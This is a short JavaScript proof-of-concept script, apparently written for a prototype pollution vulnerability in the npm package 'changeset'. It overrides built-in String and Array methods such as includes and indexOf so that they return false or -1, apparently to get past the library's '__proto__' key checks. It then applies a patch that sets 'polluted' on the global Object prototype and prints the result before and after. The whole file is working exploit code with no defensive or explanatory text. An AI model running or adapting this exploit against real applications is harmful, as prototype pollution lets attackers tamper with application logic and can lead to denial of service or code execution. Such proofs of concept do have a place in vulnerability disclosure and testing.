String.prototype.includes = () => false;
String.prototype.startsWith = () => false;
String.prototype.endsWith = () => false;
String.prototype.indexOf = () => -1;
String.prototype.lastIndexOf = () => false;
String.prototype.match = () => false;
String.prototype.search = () => false;
String.prototype.matchAll = () => false;
Array.prototype.includes = () => false;
Array.prototype.indexOf = () => -1;
console.log({}.polluted);
const changeset = require('changeset');
const patch = [{
        type: 'put',
        key: [
            '__proto__',
            'polluted'
        ],
        value: 'yes'
    }];
changeset.apply(patch, {}, true);
console.log({}.polluted);